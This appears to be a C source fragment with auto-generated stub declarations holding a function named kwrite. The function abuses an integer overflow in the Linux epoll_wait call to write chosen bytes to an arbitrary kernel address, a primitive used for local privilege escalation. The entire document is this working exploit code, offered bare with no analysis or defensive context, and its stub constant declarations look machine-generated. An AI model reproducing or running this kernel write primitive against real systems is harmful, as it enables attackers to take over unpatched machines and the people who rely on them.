
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct epoll_event {int events; int data; } ;


 int AF_UNIX ;
 int DIV ;
 int EPOLLERR ;
 int EPOLLHUP ;
 int EPOLLIN ;
 int EPOLLOUT ;
 int EPOLLPRI ;
 int EPOLL_CTL_ADD ;
 int EPOLL_CTL_MOD ;
 int RES ;
 int SOCK_DGRAM ;
 int* alloca (int) ;
 int close (int) ;
 int dup2 (int,int) ;
 int epoll_create (int) ;
 int epoll_ctl (int,int ,int,struct epoll_event*) ;
 int epoll_wait (int,void*,unsigned int,int) ;
 int fatal (char*) ;
 int memcpy (int *,char*,int) ;
 int perror (char*) ;
 int printf (char*,void*,char*,int) ;
 int send (int,char*,int,int ) ;
 scalar_t__ socketpair (int ,int ,int ,int*) ;

__attribute__((used)) static int
kwrite(unsigned base, char *buf, int num)
{



int efd, c, i, fd;
int pi[2];
struct epoll_event ev;
int *stab;
unsigned long ptr;
int count;
unsigned magic = 0xffffffff / 12 + 1;

 printf("[+] kwrite base %p, buf %p,num %d\n", (void *)base,buf,num);

 efd = epoll_create(4096);
 if (efd < 0)
  return -1;

 ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;


 count = (num+11)/12+4;


 stab = alloca((count+256 -1)/256*sizeof(int));

 for (i = 0; i < ((count+256 -1)/256)+1; i++)
 {

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0)
   return -1;

  send(pi[0], "a", 1, 0);
  stab[i] = pi[1];
 }


 fd = pi[1];


 epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev);

 for (i = 0, c = 0; i < (count-1); i++)
 {
  int n;
  n = dup2(stab[i/256], fd+2+(i % 256));
  if (n < 0)
   return -1;
  epoll_ctl(efd, EPOLL_CTL_ADD, n, &ev);
  close(n);
 }


 for (i = 0; i < ((num+7)/8); i++)
 {

  memcpy(&ev.data, buf + num - 8 - i * 8, 8);
  epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);


  ptr = (base + num - (i*8)) - (count * 12);
  struct epoll_event *events =(struct epoll_event *)ptr;

  int iret =epoll_wait(efd, (void *) ptr, magic, 31337);
  if (iret ==-1)
  {
   perror("epoll_wait");
   fatal("This kernel not vulnerability!!!");

  }

  if (i)
  {

   iret = epoll_wait(efd, (void *)ptr, magic, 31337);
                 if (iret ==-1)
                 {
                        perror("epoll_wait");
    fatal("This kernel not vulnerability!!!");

                 }

  }
 }

 close(efd);
 for (i = 3; i <= fd; i++)
  close(i);

 return 0;

}
